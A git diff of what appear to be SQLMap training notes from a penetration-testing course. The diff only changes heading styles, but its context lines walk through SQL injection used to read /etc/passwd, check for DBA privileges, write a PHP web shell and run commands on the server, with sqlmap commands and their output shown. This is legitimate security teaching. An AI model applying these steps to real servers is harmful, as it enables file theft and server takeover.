@@ -1832,10 +1832,11 @@ The other bypass mechanisms is the `HTTP parameter pollution` (`HPP`), where p
 ### OS Exploitation
 
 SQLMap has the ability to utilize an SQL Injection to read and write files from the local system outside the DBMS. SQLMap can also attempt to give us direct command execution on the remote host if we had the proper privileges.
+<div align="center">
+<br>
+</div>
 
----
-
-## File Read/Write
+#### File Read/Write
 
 The first part of OS Exploitation through an SQL Injection vulnerability is reading and writing data on the hosting server. Reading data is much more common than writing data, which is strictly privileged in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in MySql, to read local files, the DB user must have the privilege to `LOAD DATA` and `INSERT`, to be able to load the content of a file to a table and then reading that table.
 
@@ -1844,10 +1845,12 @@ An example of such a command is:
 - `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`
 
 While we do not necessarily need to have database administrator privileges (DBA) to read data, this is becoming more common in modern DBMSes. The same applies to other common databases. Still, if we do have DBA privileges, then it is much more probable that we have file-read privileges.
+<div align="center">
+<br>
+<br>
+</div>
 
----
-
-## Checking for DBA Privileges
+#### Checking for DBA Privileges
 
 To check whether we have DBA privileges with SQLMap, we can use the `--is-dba` option:
 
@@ -1865,10 +1868,12 @@ To test OS exploitation, let's try an exercise in which we do have DBA privilege
 `adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba         ___       __H__ ___ ___["]_____ ___ ___  {1.4.11#stable} |_ -| . [']     | .'| . | |___|_  ["]_|_|_|__,|  _|       |_|V...       |_|   http://sqlmap.org [*] starting @ 17:37:47 /2020-11-19/ [17:37:47] [INFO] resuming back-end DBMS 'mysql' [17:37:47] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ...SNIP... current user is DBA: True [*] ending @ 17:37:48 /2020-11-19/`
 
 We see that this time we get `current user is DBA: True`, meaning that we may have the privilege to read local files.
+<div align="center">
+<br>
+<br>
+</div>
 
----
-
-## Reading Local Files
+#### Reading Local Files
 
 Instead of manually injecting the above line through SQLi, SQLMap makes it relatively easy to read local files with the `--file-read` option:
 
@@ -1881,10 +1886,12 @@ As we can see, SQLMap said `files saved` to a local file. We can `cat` the l
 `adampueman@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...SNIP...`
 
 We have successfully retrieved the remote file.
+<div align="center">
+<br>
+<br>
+</div>
 
----
-
-## Writing Local Files
+#### Writing Local Files
 
 When it comes to writing files to the hosting server, it becomes much more restricted in modern DMBSes, since we can utilize this to write a Web Shell on the remote server, and hence get code execution and take over the server.
 
@@ -1911,10 +1918,12 @@ Now, we can attempt to access the remote PHP shell, and execute a sample command
 `adampueman@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la total 148 drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 . drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 .. -rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php ...SNIP...`
 
 We see that our PHP shell was indeed written on the remote server, and that we do have command execution over the host server.
+<div align="center">
+<br>
+<br>
+</div>
 
----
-
-## OS Command Execution
+#### OS Command Execution
 
 Now that we confirmed that we could write a PHP shell to get command execution, we can test SQLMap's ability to give us an easy OS shell without manually writing a remote shell. SQLMap utilizes various techniques to get a remote shell through SQL injection vulnerabilities, like writing a remote shell, as we just did, writing SQL functions that execute commands and retrieve output or even using some SQL queries that directly execute OS command, like `xp_cmdshell` in Microsoft SQL Server. To get an OS shell with SQLMap, we can use the `--os-shell` option, as follows:
 
